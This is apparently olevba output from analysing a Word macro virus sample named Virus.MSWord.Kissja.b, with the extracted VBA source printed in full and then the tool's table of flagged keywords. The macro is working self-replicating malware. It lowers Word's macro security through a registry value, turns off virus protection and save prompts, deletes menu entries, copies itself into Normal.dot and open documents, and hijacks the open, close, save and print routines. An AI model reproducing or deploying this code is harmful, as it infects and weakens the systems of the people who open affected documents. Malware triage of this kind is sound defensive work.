olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kissja.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kissja.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSWord.bas 
in file: Virus.MSWord.Kissja.b - OLE stream: 'Macros/VBA/MSWord'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Myself, NormInstall, ActivInstall As Boolean
Private FinalClose As Boolean
Private HoldDoc As String

Sub W97()
On Error Resume Next
Myself = True
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Application.ScreenUpdating = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
HoldDoc = ActiveDocument.FullName
CommandBars("Tools").Controls("Templates and Add-Ins...").Delete
CommandBars("Format").Controls("Style...").Delete
If (GetAttr(NormalTemplate.FullName) <> vbNormal) Then SetAttr (NormalTemplate.FullName), vbNormal
' Get up, get up Bulgarian supermen!!
Application.VBE.ActiveVBProject.VBComponents("MSWord").Export Application.StartupPath + "\MSWord.sys"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
'666
If NormalTemplate.VBProject.VBComponents(i).Name = "MSWord" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "MSWord" Then ActivInstall = True
Next i
If NormInstall = False Then NormalTemplate.VBProject.VBComponents.Import Application.StartupPath + "\MSWord.sys"
If ActivInstall = False Then ActiveDocument.VBProject.VBComponents.Import Application.StartupPath + "\MSWord.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
'W2000.Mooshka Jerry (c) 1999 by Bobin Soosslik
If (GetAttr(Application.StartupPath + "\MSWord.dot") <> vbNormal) Then SetAttr (Application.StartupPath + "\MSWord.sys"), vbNormal
ActiveDocument.SaveAs FileName:=Application.StartupPath + "\MSWord.dot", _
FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
If FinalClose = False Then Documents.Open FileName:=HoldDoc
Documents(Application.StartupPath + "\MSWord.dot").Close
SetAttr (Application.StartupPath + "\MSWord.dot"), vbReadOnly
Application.ScreenUpdating = True
Myself = False
End Sub

Sub AutoOpen()
On Error Resume Next
If Myself = False Then Call W97
End Sub

Sub AutoClose()
On Error Resume Next
FinalClose = True
Call W97
End Sub

Sub AutoExit()
On Error Resume Next
Call W97
End Sub

Sub FileSaveAs()
On Error Resume Next
Call W97
Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub filesave()
On Error Resume Next
Call W97
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
End Sub

Sub fileclose()
On Error Resume Next
Call W97
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
ActiveDocument.Close
End Sub

Sub fileprint()
On Error Resume Next
Call W97
Dialogs(wdDialogFilePrint).Show
End Sub

Sub ViewVBCode()
On Error Resume Next
Call W97
End Sub

Sub ToolsMacro()
On Error Resume Next
Call W97
End Sub

Sub FileTemplates()
On Error Resume Next
Call W97
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

